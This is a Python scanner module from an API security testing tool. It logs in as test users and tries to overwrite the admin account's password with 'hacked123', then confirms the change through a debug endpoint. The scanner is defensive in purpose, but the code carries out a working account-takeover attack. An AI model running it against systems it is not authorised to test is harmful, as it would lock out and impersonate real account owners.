#!/usr/bin/env python3
"""
Unauthorized Password Change (Account Takeover) Test Script
Checks if an API endpoint is vulnerable to unauthorized password changes
by attempting to modify another user's password using a non-admin token.
"""

import requests
from typing import Dict, List, Optional
from .base_scanner import BaseScanner
from RAGScripts.utils.logger import setup_scanner_logger

class UnauthorizedPasswordChangeScanner(BaseScanner):
    @staticmethod
    def scan(url: str, method: str, path: str, response: requests.Response, token: Optional[str] = None) -> List[Dict]:
        logger = setup_scanner_logger("unauthorized_password_change")
        vulnerabilities = []
        
        # Test credentials
        test_users = [
            {"username": "test1", "password": "test1"},
            {"username": "test2", "password": "test2"}
        ]
        
        for user in test_users:
            try:
                # Login to get auth token
                login_url = f"{url}/users/v1/login"
                login_resp = requests.post(
                    login_url,
                    json=user,
                    timeout=5
                )
                
                if login_resp.status_code != 200:
                    continue
                    
                auth_token = login_resp.json().get("auth_token")
                if not auth_token:
                    continue
                    
                # Try to change another user's password
                target_username = "admin"
                new_password = "hacked123"
                
                change_url = f"{url}/users/v1/{target_username}/password"
                headers = {"Authorization": f"Bearer {auth_token}"}
                payload = {"password": new_password}
                
                change_resp = requests.put(
                    change_url,
                    json=payload,
                    headers=headers,
                    timeout=5
                )
                
                if change_resp.status_code in [200, 204]:
                    # Verify if password was actually changed
                    debug_url = f"{url}/users/v1/_debug"
                    debug_resp = requests.get(debug_url, timeout=5)
                    
                    if debug_resp.status_code == 200:
                        users = debug_resp.json().get("users", [])
                        for debug_user in users:
                            if debug_user.get("username") == target_username:
                                vulnerabilities.append({
                                    "type": "UNAUTHORIZED_PASSWORD_CHANGE",
                                    "severity": "HIGH",
                                    "detail": f"Successfully changed {target_username}'s password using non-admin credentials",
                                    "evidence": {
                                        "url": change_url,
                                        "payload": payload,
                                        "response": debug_resp.json()
                                    }
                                })
                                break
                                
            except requests.RequestException as e:
                logger.error(f"Error in unauthorized password change check: {str(e)}")
                continue
                
        return vulnerabilities

scan = UnauthorizedPasswordChangeScanner.scan
